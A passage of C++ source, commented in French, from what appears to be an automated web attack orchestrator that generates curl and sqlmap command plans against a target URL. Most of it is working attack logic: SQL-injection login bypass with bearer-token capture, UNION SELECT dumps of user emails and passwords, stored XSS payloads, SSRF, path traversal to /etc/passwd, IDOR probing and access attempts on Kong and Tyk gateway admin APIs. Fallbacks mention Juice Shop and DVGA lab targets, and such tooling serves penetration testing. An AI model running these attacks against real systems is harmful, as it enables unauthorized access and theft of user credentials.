
            std::ostringstream oss;
            oss << "if [ -s " << shell_escape_double_quotes(token_file.string()) << " ]; then "
                << "TOK=$(head -n1 " << shell_escape_double_quotes(token_file.string()) << "); "
                << "curl -sk -D - -H \"Authorization: Bearer $TOK\" "
                << shell_escape_double_quotes(ep)
                << " > " << shell_escape_double_quotes(c.outfile.string()) << " ; "
                << "else echo 'NO_TOKEN' > " << shell_escape_double_quotes(c.outfile.string()) << " ; "
                << "fi";

            c.command = oss.str();
            plan.push_back(std::move(c));
            ++idx;
        }
    }

    // ---------------------- 3.3 SQLi heuristique + DUMP générique --------
    auto url_encode_local = [](const std::string& v) {
        return url_encode(v);
    };

    {
        std::vector<string> sqli_eps;
        for (const auto& u : rest_eps) {
            if (looks_searchy(u)) sqli_eps.push_back(u);
        }
        if (sqli_eps.empty()) {
            for (const auto& u : rest_eps) {
                sqli_eps.push_back(u);
                if (sqli_eps.size() >= 5) break;
            }
        }
        if (sqli_eps.size() > 10) sqli_eps.resize(10);

        int idx = 0;
        for (const auto& ep : sqli_eps) {
            string param = detect_param_name(ep, "q");
            fs::path out_ok    = outdir / ("sqli_" + std::to_string(idx) + "_ok.txt");
            fs::path out_sqli  = outdir / ("sqli_" + std::to_string(idx) + "_inj.txt");
            fs::path out_sum   = outdir / ("sqli_" + std::to_string(idx) + "_summary.txt");
            fs::path out_enum  = outdir / ("db_sqli_enum_" + std::to_string(idx) + ".txt");
            fs::path out_dump  = outdir / ("db_sqli_dump_" + std::to_string(idx) + ".txt");

            // baseline
            {
                std::ostringstream oss;
                oss << "HDR=$(/usr/bin/curl -sk -I "
                    << shell_escape_double_quotes(ep) << " | tr -d '\\r'); "
                    << "if echo \"$HDR\" | awk 'BEGIN{IGNORECASE=1} "
                    << "/content-type: *application\\/json/ {exit 0} {exit 1}'; then "
                    << "  /usr/bin/curl -sk -G " << shell_escape_double_quotes(ep)
                    << "    --data-urlencode '" << param << "=banana' "
                    << "    | jq -r 'length' > " << shell_escape_double_quotes(out_ok.string()) << "; "
                    << "else echo 0 > " << shell_escape_double_quotes(out_ok.string()) << "; fi";

                mk_cmd(21000 + idx*10,
                       "Heuristique SQLi – baseline sur " + ep,
                       oss.str(),
                       out_ok);
            }

            // Payload SQLi
            {
                // On réutilise l'endpoint courant 'ep' et le param détecté 'param'
                string rest_search = ep;

                string cmd =
                    "HDR=$(/usr/bin/curl -sk -I '" + rest_search + "' | tr -d '\\r'); "
                    "if echo \"$HDR\" | awk 'BEGIN{IGNORECASE=1} /content-type: *application\\/json/ {exit 0} {exit 1}'; then "
                    "  /usr/bin/curl -sk -G '" + rest_search + "' "
                    "    --data-urlencode '" + param + "=%27 OR 1=1--' "
                    "    | jq -r 'length' > '" + out_sqli.string() + "'; "
                    "else echo 0 > '" + out_sqli.string() + "'; fi";

                mk_cmd(20011,
                    "DVGA compat – REST SQLi payload (search)",
                    cmd,
                    out_sqli);
            }


            // résumé SQLi
            {
                std::ostringstream oss;
                oss << "OK=$(awk 'NR==1{print $1; exit}' "
                    << shell_escape_double_quotes(out_ok.string())
                    << " 2>/dev/null || echo 0); "
                    << "SQLI=$(awk 'NR==1{print $1; exit}' "
                    << shell_escape_double_quotes(out_sqli.string())
                    << " 2>/dev/null || echo 0); "
                    << "DELTA=$((SQLI-OK)); "
                    << "echo \"OK=$OK SQLI=$SQLI DELTA=$DELTA\" > "
                    << shell_escape_double_quotes(out_sum.string());

                mk_cmd(21002 + idx*10,
                       "Heuristique SQLi – delta sur " + ep,
                       oss.str(),
                       out_sum);
            }

            // Exploit SQLi – ENUM TABLES (MySQL/Postgres info_schema)
            {
                std::ostringstream oss;
                oss << "/usr/bin/curl -sk -G "
                    << shell_escape_double_quotes(ep)
                    << " --data-urlencode '"
                    << param
                    << "=1 UNION SELECT table_name FROM information_schema.tables LIMIT 20' "
                    << "> " << shell_escape_double_quotes(out_enum.string());

                mk_cmd(21003 + idx*10,
                       "SQLi exploitation – enum tables information_schema sur " + ep,
                       oss.str(),
                       out_enum);
            }

            // Exploit SQLi – DUMP USERS (users/email/password)
            {
                std::ostringstream oss;
                oss << "/usr/bin/curl -sk -G "
                    << shell_escape_double_quotes(ep)
                    << " --data-urlencode '"
                    << param
                    << "=1 UNION SELECT email,password FROM users LIMIT 20' "
                    << "> " << shell_escape_double_quotes(out_dump.string());

                mk_cmd(21004 + idx*10,
                       "SQLi exploitation – dump générique users/email/password sur " + ep,
                       oss.str(),
                       out_dump);
            }

            // Optionnel : SQLmap full-auto si présent
            {
                fs::path out_sqlmap = outdir / ("sqlmap_" + std::to_string(idx) + ".log");
                fs::path outdir_sqlmap = workdir / ("sqlmap_" + std::to_string(idx));
                std::ostringstream oss;
                oss << "if command -v sqlmap >/dev/null 2>&1; then "
                    << "sqlmap -u " << shell_escape_double_quotes(ep)
                    << " --batch --random-agent --level=2 --risk=2 "
                    << "--disable-coloring "
                    << "--output-dir=" << shell_escape_double_quotes(outdir_sqlmap.string())
                    << " > " << shell_escape_double_quotes(out_sqlmap.string())
                    << " 2>&1 ; fi";

                mk_cmd(21005 + idx*10,
                       "SQLmap auto-exploitation générique sur " + ep,
                       oss.str(),
                       out_sqlmap);
            }

            ++idx;
        }
    }

    // ---------------------- 3.4 XSS avec marqueurs dynamiques ------------
    {
        std::string marker_base = "XSS_DARKMOON_";
        marker_base += std::to_string((long long)std::time(nullptr));

        std::vector<string> xss_eps;
        for (const auto& u : rest_eps) {
            if (looks_xssy(u)) xss_eps.push_back(u);
        }

        int idx = 0;
        for (const auto& ep : xss_eps) {
            std::vector<string> payloads = {
                std::string(R"({"comment":")") + marker_base + "_IMG\"><img src=x onerror=alert(1)>\",\"rating\":1}",
                std::string(R"({"comment":")") + marker_base + "_SCRIPT\"><script>alert(1)</script>\",\"rating\":1}"
            };

            int pidx = 0;
            for (const auto& pj : payloads) {
                ConfirmationCommand c;
                c.id          = "REST_XSS_POST_" + std::to_string(idx) +
                                "_" + std::to_string(pidx);
                c.description = "Tentative XSS générique sur " + ep;
                c.outfile     = outdir / ("rest_xss_" + std::to_string(idx) +
                                          "_" + std::to_string(pidx) + ".txt");

                std::ostringstream oss;
                oss << "curl -sk -D - -H \"Content-Type: application/json\" "
                    << "--data-binary " << shell_escape_double_quotes(pj) << " "
                    << shell_escape_double_quotes(ep)
                    << " > " << shell_escape_double_quotes(c.outfile.string());

                c.command = oss.str();
                plan.push_back(std::move(c));
                ++pidx;
            }
            ++idx;
        }
    }

    // ---------------------- 3.5 SSRF basique -----------------------------
    {
        std::vector<string> ssrf_eps;
        for (const auto& u : rest_eps) {
            if (looks_ssrfy(u)) ssrf_eps.push_back(u);
        }
        if (ssrf_eps.size() > 10) ssrf_eps.resize(10);

        int idx = 0;
        for (const auto& ep : ssrf_eps) {
            string param = detect_param_name(ep, "url");
            string full  = ep;
            string target = baseurl;

            if (full.find('?') != string::npos) {
                full += "&" + param + "=" + url_encode_local(target);
            } else {
                full += "?" + param + "=" + url_encode_local(target);
            }

            ConfirmationCommand c;
            c.id          = "REST_SSRF_" + std::to_string(idx);
            c.description = "Tentative SSRF générique sur " + ep;
            c.outfile     = outdir / ("rest_ssrf_" + std::to_string(idx) + ".txt");

            std::ostringstream oss;
            oss << "curl -sk -D - " << shell_escape_double_quotes(full)
                << " > " << shell_escape_double_quotes(c.outfile.string());

            c.command = oss.str();
            plan.push_back(std::move(c));
            ++idx;
        }
    }
}


// Gateways admin policy abuse
static void append_api_gateway_policy_cmds(const std::string& baseurl,
                                           const fs::path& workdir,
                                           const nlohmann::json& trig,
                                           std::vector<ConfirmationCommand>& plan,
                                           nlohmann::json& plan_json)
{
    using nlohmann::json;

    std::string host = extract_hostname(baseurl);
    int i = 0;

    for (auto& g : trig.value("gateways", json::array())) {
        std::string gw = g.get<std::string>();

        if (gw == "kong") {
            std::vector<std::string> admin = {
                "http://"  + host + ":8001/routes",
                "https://" + host + ":8444/routes",
                "http://"  + host + ":8001/services",
                "https://" + host + ":8444/services",
                "http://"  + host + ":8001/plugins",
                "https://" + host + ":8444/plugins"
            };
            for (auto& u : admin) {
                std::string safe = shell_escape_double_quotes(u);
                fs::path out     = workdir / ("api_gateway_kong_" +
                                              std::to_string(i) + ".txt");
                std::string cmd  = "curl -sk -D - \"" + safe + "\"";
                add_api_flow(plan, plan_json,
                             "FLOW_API_GATEWAY_POLICY_ABUSE_" +
                             std::to_string(i),
                             "API_GATEWAY_POLICY_ABUSE", u,
                             "Gateway policy abuse (Kong): tentative accès admin GET " +
                             u,
                             cmd, out, {{"gateway", "kong"}});
                ++i;
            }
        } else if (gw == "tyk") {
            std::vector<std::string> admin = {
                "http://" + host + ":8080/tyk/apis",
                "http://" + host + ":8080/tyk/keys",
                "http://" + host + ":9696/tyk/keys"
            };
            for (auto& u : admin) {
                std::string safe = shell_escape_double_quotes(u);
                fs::path out     = workdir / ("api_gateway_tyk_" +
                                              std::to_string(i) + ".txt");
                std::string cmd  = "curl -sk -D - \"" + safe + "\"";
                add_api_flow(plan, plan_json,
                             "FLOW_API_GATEWAY_POLICY_ABUSE_" +
                             std::to_string(i),
                             "API_GATEWAY_POLICY_ABUSE", u,
                             "Gateway policy abuse (Tyk): tentative accès admin GET " +
                             u,
                             cmd, out, {{"gateway", "tyk"}});
                ++i;
            }
        } else if (gw == "apigee") {
            // souvent externalisé ; on enregistre juste l’indice
            fs::path out = workdir / "api_gateway_apigee_hint.txt";
            try {
                std::ofstream f(out.string());
                f << "apigee detected on " << host << "\n";
            } catch (...) {}
            plan_json["notes"].push_back(
                "Apigee détecté : vérifier management API côté tenant, non exposé sur la cible.");
        }
    }
}

// API — orchestrateur : construit les flows et enrichit le plan (signature d'origine à 4 args)
// API — orchestrateur générique (REST + OpenAPI + GraphQL + SOAP + ZAP spider/ascan + attaques ciblées)
// Signature d'origine à 4 args (on ne change rien ailleurs)
static void append_api_flows(const std::string& baseurl,
                             const fs::path& workdir,
                             std::vector<ConfirmationCommand>& plan,
                             nlohmann::json& plan_json)
{
    using nlohmann::json;
    namespace fs = std::filesystem;

    // ------------------------------------------------------------------
    // 0) Discovery (déjà amélioré par tes étapes Katana/Wayback + post-probe)
    // ------------------------------------------------------------------
    json trig = harvest_api_triggers(baseurl, workdir);
    plan_json["api_triggers"] = trig;

    // ------------------------------------------------------------------
    // 1) Enum générique déjà en place (ne pas casser l’existant)
    // ------------------------------------------------------------------
    append_api_enum_cmds(trig, baseurl, workdir, plan);
    append_api_auth_bypass_cmds(workdir, trig, plan, plan_json);

    bool intrusive = false;
    try { if (plan_json.contains("intrusive")) intrusive = plan_json["intrusive"].get<bool>(); } catch (...) {}
    append_api_graphql_abuse_cmds(trig, baseurl, workdir, plan, intrusive);
    append_api_gateway_policy_cmds(baseurl, workdir, trig, plan, plan_json);

    // ------------------------------------------------------------------
    // 2) Paramètres ZAP (via ENV ou token file) — pas de helper
    // ------------------------------------------------------------------
    auto getenv_or = [](const char* k, const char* defv) {
        const char* v = std::getenv(k);
        return (v && *v) ? std::string(v) : std::string(defv);
    };
    std::string zap_host  = getenv_or("DM_ZAP_HOST",  "zap");
    std::string zap_port  = getenv_or("DM_ZAP_PORT",  "8888");
    std::string zap_apikey;
    {
        const char* k = std::getenv("DM_ZAP_APIKEY");
        if (k && *k) zap_apikey = k;
        else {
            std::ifstream fin("/zap/wrk/ZAP-API-TOKEN");
            if (fin) std::getline(fin, zap_apikey);
        }
    }
    auto root_of = [](std::string s){ if(!s.empty() && s.back()=='/') s.pop_back(); return s; };
    const std::string root = root_of(baseurl);

    auto zap_json_call = [&](const std::string& url, const std::string& tag){
        ConfirmationCommand c{};
        c.id          = "ZAP_CALL_" + tag;
        c.description = "ZAP API call: " + tag;
        c.outfile     = (workdir / ("zap_" + tag + ".txt")).string();
        c.command     = "curl -s " + url + " | tee " + shell_escape_double_quotes(c.outfile);
        plan.push_back(c);
    };

    // ------------------------------------------------------------------
    // 3) (Optionnel) Installation des add-ons ZAP utiles (si DM_ZAP_INSTALL_ADDONS=1)
    // ------------------------------------------------------------------
    if (std::getenv("DM_ZAP_INSTALL_ADDONS") && std::string(std::getenv("DM_ZAP_INSTALL_ADDONS")) == "1") {
        std::vector<std::string> addons = {
            "openapi","graphql","soap","ajaxSpider",
            "pscanrulesAlpha","pscanrulesBeta",
            "ascanrulesAlpha","ascanrulesBeta",
            "fuzz","importurls","retire"
        };
        for (auto& id : addons) {
            std::ostringstream u;
            u << "http://" << zap_host << ":" << zap_port
              << "/JSON/autoupdate/action/installAddon/?id=" << shell_escape_double_quotes(id);
            if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
            zap_json_call(u.str(), "installAddon_" + id);
        }
    }

    // ------------------------------------------------------------------
    // 4) Import OpenAPI / SOAP / Seeding ZAP + Spider / AJAX Spider / ASCAN
    // ------------------------------------------------------------------
    // 4.a Import OpenAPI (si des candidats ont été trouvés)
    if (trig.contains("openapi_candidates") && trig["openapi_candidates"].is_array()) {
        for (auto& it : trig["openapi_candidates"]) {
            if (!it.is_string()) continue;
            std::string url = it.get<std::string>();
            std::ostringstream u;
            u << "http://" << zap_host << ":" << zap_port
              << "/JSON/openapi/action/importUrl/?url=" << shell_escape_double_quotes(url);
            if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
            zap_json_call(u.str(), "openapi_import_" + std::to_string(std::hash<std::string>{}(url)));
        }
    }

    // 4.b Import SOAP (si WSDL vu)
    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
        for (auto& it : trig["rest_endpoints"]) {
            if (!it.is_string()) continue;
            std::string url = it.get<std::string>();
            std::string l   = to_lower_copy(url);
            if (l.find(".wsdl") != std::string::npos || l.find("?wsdl") != std::string::npos) {
                std::ostringstream u;
                u << "http://" << zap_host << ":" << zap_port
                  << "/JSON/soap/action/importUrl/?url=" << shell_escape_double_quotes(url);
                if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
                zap_json_call(u.str(), "soap_import_" + std::to_string(std::hash<std::string>{}(url)));
            }
        }
    }

    // 4.c Seeding ZAP (accessUrl sur quelques endpoints utiles)
    {
        std::set<std::string> seeds;
        auto push_seed = [&](const std::string& u){
            if (seeds.insert(u).second) {
                std::ostringstream a;
                a << "http://" << zap_host << ":" << zap_port
                  << "/JSON/core/action/accessUrl/?url=" << shell_escape_double_quotes(u) << "&followRedirects=true";
                if (!zap_apikey.empty()) a << "&apikey=" << shell_escape_double_quotes(zap_apikey);
                zap_json_call(a.str(), "seed_" + std::to_string(std::hash<std::string>{}(u)));
            }
        };

        if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
            int cap = 0;
            for (auto& it : trig["rest_endpoints"]) {
                if (!it.is_string()) continue;
                std::string u = it.get<std::string>();
                // on seed une sélection variée mais bornée
                if (++cap > 40) break;
                push_seed(u);
            }
        }
        // seed la racine
        push_seed(root);
    }

    // 4.d Import des endpoints GraphQL dans ZAP (add-on GraphQL)
    //
    // trig["graphql_endpoints"] est rempli par harvest_api_triggers(...)
    // On demande à ZAP d'importer une définition GraphQL via introspection
    // en passant endurl=url=endpoint (le plugin s'occupera d'envoyer la query).
    if (trig.contains("graphql_endpoints") && trig["graphql_endpoints"].is_array()) {
        for (auto &it : trig["graphql_endpoints"]) {
            if (!it.is_string()) continue;
            std::string endpoint = it.get<std::string>();

            // Construction de l'URL API ZAP pour importUrl
            std::ostringstream u;
            u << "http://" << zap_host << ":" << zap_port
              << "/JSON/graphql/action/importUrl/?endurl="
              << shell_escape_double_quotes(endpoint)
              << "&url=" << shell_escape_double_quotes(endpoint);

            if (!zap_apikey.empty()) {
                u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
            }

            zap_json_call(
                u.str(),
                "graphql_import_" +
                std::to_string(std::hash<std::string>{}(endpoint))
            );
        }
    }

    // 4.d Spider classique
    {
        std::ostringstream u;
        u << "http://" << zap_host << ":" << zap_port
          << "/JSON/spider/action/scan/?url=" << shell_escape_double_quotes(root)
          << "&recurse=true";
        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
        zap_json_call(u.str(), "spider_scan");
    }

    // 4.e AJAX Spider (DOM/XHR)
    {
        std::ostringstream u;
        u << "http://" << zap_host << ":" << zap_port
          << "/JSON/ajaxSpider/action/scan/?url=" << shell_escape_double_quotes(root);
        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
        zap_json_call(u.str(), "ajax_spider_scan");
    }

    // 4.f Active Scan ciblé (baseurl)
    {
        std::ostringstream u;
        u << "http://" << zap_host << ":" << zap_port
          << "/JSON/ascan/action/scan/?url=" << shell_escape_double_quotes(root)
          << "&recurse=true";
        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
        zap_json_call(u.str(), "ascan_scan_root");
    }

    // ------------------------------------------------------------------
    // 5) Attaques REST génériques (couvrent Juice Shop + d’autres apps)
    // ------------------------------------------------------------------
    std::vector<std::string> rest = trig.value("rest_endpoints", std::vector<std::string>{});

    // 5.a Tentatives de Login (SQLi/by-pass) & extraction de token
    fs::path token_file = workdir / "bearer_token.txt";
    {
        std::vector<std::string> login_paths;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("login")  != std::string::npos ||
                l.find("signin") != std::string::npos ||
                l.find("auth")   != std::string::npos)
            {
                login_paths.push_back(u);
            }
        }
        if (login_paths.empty()) {
            // fallback type DVGA / Juice Shop
            login_paths.push_back(root + "/rest/user/login");
        }

        int i = 0;
        for (auto& url : login_paths) {
            ConfirmationCommand c{};
            c.id          = "REST_LOGIN_SQLI_" + std::to_string(i);
            c.description = "Attempt SQLi login on " + url;
            c.outfile     = (workdir / ("rest_login_" + std::to_string(i) + ".json")).string();

            // On construit le JSON proprement et on le met dans des guillemets pour le shell
            nlohmann::json body = {
                { "email",    "' OR 1=1--" },
                { "password", "x" }
            };

            std::ostringstream oss;
            oss << "("
                << "curl -sk -H \"Content-Type: application/json\" "
                << "--data-binary \""
                << shell_escape_double_quotes(body.dump())
                << "\" "
                << shell_escape_double_quotes(url)
                << " || true"
                << ") | tee " << shell_escape_double_quotes(c.outfile)
                << " | jq -r '.authentication.token"
                             " // .data.token"
                             " // .token"
                             " // .access_token"
                             " // .jwt"
                             " // empty' 2>/dev/null | head -n1 > "
                << shell_escape_double_quotes(token_file.string())
                << " ; if [ -s " << shell_escape_double_quotes(token_file.string())
                << " ]; then echo TOKEN_OK; else echo TOKEN_FAIL; fi";

            c.command = oss.str();
            plan.push_back(c);
            ++i;
        }
    }

    // 5.b Admin/priv endpoints avec Bearer (si token)
    auto add_bearer_get = [&](const std::string& url, const std::string& tag){
        ConfirmationCommand c{};
        c.id          = "REST_BEARER_" + tag;
        c.description = "Bearer GET " + url;
        c.outfile     = (workdir / ("rest_bearer_" + tag + ".txt")).string();
        std::ostringstream oss;
        oss << "if [ -s " << shell_escape_double_quotes(token_file.string()) << " ]; then "
            << "TOK=$(cat " << shell_escape_double_quotes(token_file.string()) << "); "
            << "curl -sk -D - -H \"Authorization: Bearer ${TOK}\" "
            << shell_escape_double_quotes(url)
            << " | tee " << shell_escape_double_quotes(c.outfile)
            << " ; else echo NO_TOKEN | tee " << shell_escape_double_quotes(c.outfile) << " ; fi";
        c.command = oss.str();
        plan.push_back(c);
    };

    {
        // Heuristique : endpoints “admin/”, “/config”, “/users”
        std::set<std::string> admin_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("/admin")!=std::string::npos || l.find("application-configuration")!=std::string::npos ||
                l.find("/users")!=std::string::npos || l.find("/config")!=std::string::npos) {
                admin_like.insert(u);
            }
        }
        // si rien repéré → quelques fallbacks connus
        if (admin_like.empty()) {
            admin_like.insert(root + "/rest/admin/application-configuration");
            admin_like.insert(root + "/rest/admin/users");
        }
        int i=0;
        for (auto& u : admin_like) add_bearer_get(u, "ADMIN_" + std::to_string(i++));
    }

    // 5.c Recherche “q=” (SQLi) — compare cardinalité
    {
        std::vector<std::string> search_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("search") != std::string::npos ||
                l.find("q=")     != std::string::npos)
            {
                search_like.push_back(u);
            }
        }
        if (search_like.empty()) {
            // fallback typique Juice Shop / DVGA
            search_like.push_back(root + "/rest/products/search?q=");
        }

        int i = 0;
        for (auto& u : search_like) {
            ConfirmationCommand c{};
            c.id          = "REST_SQLI_SEARCH_" + std::to_string(i);
            c.description = "SQLi in search on " + u;
            c.outfile     = (workdir / ("rest_sqli_search_" + std::to_string(i) + ".txt")).string();

            std::ostringstream oss;
            std::string ok_file   = (workdir / ("s_len_ok_"   + std::to_string(i) + ".txt")).string();
            std::string sqli_file = (workdir / ("s_len_sqli_" + std::to_string(i) + ".txt")).string();

            // baseline "normale"
            std::string legit;
            if (u.find("q=") != std::string::npos) {
                legit = u + "banana";
            } else {
                legit = u + (u.find('?') == std::string::npos ? "?q=banana" : "&q=banana");
            }

            // payload SQLi : on encode l'apostrophe en %27 pour ne pas casser le shell
            std::string sqli;
            if (u.find("q=") != std::string::npos) {
                sqli = u + "%27 OR 1=1--";
            } else {
                sqli = u + (u.find('?') == std::string::npos ? "?q=%27 OR 1=1--" : "&q=%27 OR 1=1--");
            }

            oss << "curl -sk " << shell_escape_double_quotes(legit)
                << " | jq -r 'length' > " << shell_escape_double_quotes(ok_file)
                << " ; "
                << "curl -sk " << shell_escape_double_quotes(sqli)
                << " | jq -r 'length' > " << shell_escape_double_quotes(sqli_file)
                << " ; echo OK=$(cat " << shell_escape_double_quotes(ok_file)
                << ") SQLI=$(cat " << shell_escape_double_quotes(sqli_file)
                << ")";

            c.command = oss.str() + " | tee " + shell_escape_double_quotes(c.outfile);
            plan.push_back(c);
            ++i;
        }
    }


    // 5.d XSS stocké/refleté — endpoints comment/feedback/review
    {
        std::vector<std::string> xss_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("feedback")!=std::string::npos || l.find("comment")!=std::string::npos || l.find("review")!=std::string::npos)
                xss_like.push_back(u);
        }
        if (xss_like.empty()) xss_like.push_back(root + "/api/Feedbacks"); // fallback JS

        std::vector<std::string> payloads = {
            R"({"comment":"<img src=x onerror=alert(1)>","rating":1})",
            R"({"comment":"<iframe src=\"javascript:alert(1)\"></iframe>","rating":1})"
        };
        int i=0;
        for (auto& url : xss_like) {
            for (auto& body : payloads) {
                ConfirmationCommand c{};
                c.id          = "REST_XSS_POST_" + std::to_string(i);
                c.description = "XSS attempt on " + url;
                c.outfile     = (workdir / ("rest_xss_" + std::to_string(i) + ".txt")).string();
                c.command     = "curl -sk -D - -H \"Content-Type: application/json\" --data-binary "
                                + shell_escape_double_quotes(body) + " "
                                + shell_escape_double_quotes(url)
                                + " | tee " + shell_escape_double_quotes(c.outfile);
                plan.push_back(c);
                ++i;
            }
        }
    }

    // 5.e SSRF — paramètres url=*, endpoint=*, target=*
    {
        std::vector<std::string> ssrf_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("url=")!=std::string::npos || l.find("endpoint=")!=std::string::npos || l.find("target=")!=std::string::npos)
                ssrf_like.push_back(u);
        }
        if (ssrf_like.empty()) {
            // Essai générique GET sur /fetch?url=
            ssrf_like.push_back(root + "/fetch?url=");
        }
        int i=0;
        for (auto& u : ssrf_like) {
            // test interne sur baseurl
            std::string try1 = u.find('?')!=std::string::npos ? (u + root) : (u + "?url=" + root);
            ConfirmationCommand c{};
            c.id          = "REST_SSRF_" + std::to_string(i);
            c.description = "SSRF attempt on " + u;
            c.outfile     = (workdir / ("rest_ssrf_" + std::to_string(i) + ".txt")).string();
            c.command     = "curl -sk -D - " + shell_escape_double_quotes(try1)
                            + " | tee " + shell_escape_double_quotes(c.outfile);
            plan.push_back(c);
            ++i;
        }
    }

    // 5.f Path Traversal simple — endpoints download/file/doc
    {
        std::vector<std::string> trav_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("download")!=std::string::npos || l.find("file")!=std::string::npos || l.find("doc")!=std::string::npos)
                trav_like.push_back(u);
        }
        int i=0;
        for (auto& u : trav_like) {
            // Tentative naive: ajouter ../../etc/passwd sur un param file/name
            std::string crafted;
            if (u.find('?')!=std::string::npos) crafted = u + "&file=../../../../etc/passwd";
            else                                crafted = u + "?file=../../../../etc/passwd";
            ConfirmationCommand c{};
            c.id          = "REST_TRAVERSAL_" + std::to_string(i);
            c.description = "Path traversal attempt on " + u;
            c.outfile     = (workdir / ("rest_traversal_" + std::to_string(i) + ".txt")).string();
            c.command     = "curl -sk -D - " + shell_escape_double_quotes(crafted)
                            + " | tee " + shell_escape_double_quotes(c.outfile);
            plan.push_back(c);
            ++i;
        }
    }

    // 5.g IDOR — remplacer id=me / id curent par d’autres IDs (1..3)
    {
        std::vector<std::string> id_like;
        for (auto& u : rest) {
            std::string l = to_lower_copy(u);
            if (l.find("id=")!=std::string::npos || l.find("/user/")!=std::string::npos)
                id_like.push_back(u);
        }
        int i=0;
        for (auto& u : id_like) {
            for (int id=1; id<=3; ++id) {
                std::string crafted = u;
                // si déjà un id= dans la querystring, on remplace rapidement (= naïf mais utile)
                auto pos = crafted.find("id=");
                if (pos != std::string::npos) {
                    auto end = crafted.find_first_of("&", pos+3);
                    crafted.replace(pos+3, (end==std::string::npos? crafted.size()-(pos+3) : end-(pos+3)),
                                    std::to_string(id));
                } else {
                    // sinon on ajoute ?id=id
                    crafted += (crafted.find('?')!=std::string::npos ? "&" : "?");
                    crafted += "id=" + std::to_string(id);
                }
                ConfirmationCommand c{};
                c.id          = "REST_IDOR_" + std::to_string(i) + "_" + std::to_string(id);
                c.description = "IDOR probe " + std::to_string(id) + " on " + u;
                c.outfile     = (workdir / ("rest_idor_" + std::to_string(i) + "_" + std::to_string(id) + ".txt")).string();
                c.command     = "curl -sk -D - " + shell_escape_double_quotes(crafted)
                                + " | tee " + shell_escape_double_quotes(c.outfile);
                plan.push_back(c);
            }
            ++i;
        }
    }

    // ------------------------------------------------------------------
    // 6) Récap
    // ------------------------------------------------------------------
    plan_json["notes"].push_back("Generic REST+API flow prepared: OpenAPI/SOAP import, ZAP spider/ajax/ascan, login SQLi→token→admin, search SQLi, XSS, SSRF, traversal, IDOR.");
}

// ---------------------- CONSOLIDATION / SORTIES ------------------------------
static std::vector<fs::path> glob_files(const fs::path& dir,
                                        const std::string& prefix)
{
    std::vector<fs::path> r;
    if (!fs::exists(dir)) return r;

    for (auto& e : fs::directory_iterator(dir)) {
        if (!fs::is_regular_file(e)) continue;
        auto n = e.path().filename().string();
        if (n.rfind(prefix, 0) == 0)
            r.push_back(e.path());
    }
    std::sort(r.begin(), r.end());
    return r;
}

static void api_catalog_from_enum_files(const fs::path& workdir,
                                        nlohmann::json& catalog)
{
    using nlohmann::json;

    catalog = json::object();
    catalog["generated_at"]          = current_datetime_string();
    catalog["rest"]["openapi_specs"] = json::array();
    catalog["rest"]["endpoints"]     = json::array();
    catalog["graphql"]["schemas"]    = json::array();
    catalog["graphql"]["endpoints"]  = json::array();
    catalog["grpc"]["services"]      = json::array();

    // OpenAPI/Swagger + REST endpoints
    for (auto& f : glob_files(workdir, "FLOW_API_ENUM_openapi_")) {
        std::string txt = slurp_if_exists(f);

        // essaie d'attraper le corps JSON (très tolérant)
        auto lb = txt.find('{');
        auto rb = txt.rfind('}');
        if (lb != std::string::npos &&
            rb != std::string::npos &&
            rb > lb) {
            try {
                auto j = json::parse(txt.substr(lb, rb - lb + 1));
                if (j.is_object() &&
                    (j.contains("openapi") || j.contains("swagger"))) {
                    catalog["rest"]["openapi_specs"].push_back(j);
                }
            } catch (...) {
                // best-effort
            }
        }

        auto u = extract_url_from_line(txt);
        if (!u.empty()) catalog["rest"]["endpoints"].push_back(u);
    }

    // GraphQL
    for (auto& f : glob_files(workdir, "FLOW_API_ENUM_graphql_")) {
        std::string txt = slurp_if_exists(f);

        auto lb = txt.find('{');
        auto rb = txt.rfind('}');
        if (lb != std::string::npos &&
            rb != std::string::npos &&
            rb > lb) {
            try {
                auto j = json::parse(txt.substr(lb, rb - lb + 1));
                catalog["graphql"]["schemas"].push_back(j);
            } catch (...) {}
        }

        auto u = extract_url_from_line(txt);
        if (!u.empty()) catalog["graphql"]["endpoints"].push_back(u);
    }

    // gRPC
    for (auto& f : glob_files(workdir, "FLOW_API_ENUM_grpc_")) {
        std::string txt = slurp_if_exists(f);
        std::istringstream ss(txt);
        std::string line;
        while (std::getline(ss, line)) {
            line = trim_copy(line);
            if (line.find('/') != std::string::npos ||
                line.find('.') != std::string::npos) {
                catalog["grpc"]["services"].push_back(line);
            }
        }
    }

    // Compat : transformer n’importe quel FLOW_API_ENUM_*.txt restant en normalisé
    for (auto& f : glob_files(workdir, "FLOW_API_ENUM_")) {
        auto n = f.filename().string();
        if (n.find("openapi_")  != std::string::npos ||
            n.find("graphql_")  != std::string::npos ||
            n.find("grpc_")     != std::string::npos)
            continue;

        std::string txt = slurp_if_exists(f);
        std::string low = to_lower_copy(txt);

        if (low.find("swagger") != std::string::npos ||
            low.find("openapi") != std::string::npos) {
            auto lb = txt.find('{');
            auto rb = txt.rfind('}');
            if (lb != std::string::npos &&
                rb != std::string::npos &&
                rb > lb) {
                try {
                    auto j = json::parse(txt.substr(lb, rb - lb + 1));
                    catalog["rest"]["openapi_specs"].push_back(j);
                } catch (...) {}
            }
        }
    }
}

// Ingestion auto des tokens trouvés vers creds_vault.json
static void api_ingest_tokens_to_vault(const fs::path& workdir,
                                       const std::string& endpoint,
                                       const std::string& blob)
{
    // Regex JWT et Set-Cookie de session
    static const std::regex re_jwt(
